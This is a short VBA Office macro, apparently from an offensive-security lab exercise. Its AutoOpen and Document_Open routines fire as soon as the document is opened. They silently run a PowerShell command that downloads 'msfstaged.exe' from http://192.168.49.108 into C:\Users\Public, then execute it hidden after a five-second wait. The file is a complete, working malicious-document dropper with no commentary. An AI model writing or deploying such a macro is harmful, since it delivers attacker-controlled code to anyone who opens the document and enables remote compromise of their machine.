Sub Document_Open()
    MyMacro    
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.108/msfstaged.exe', 'C:\Users\Public\msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = "C:\Users\Public\msfstaged.exe"
    Wait (5)
    Shell exePath, vbHide
End Sub
    
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)    
End Sub

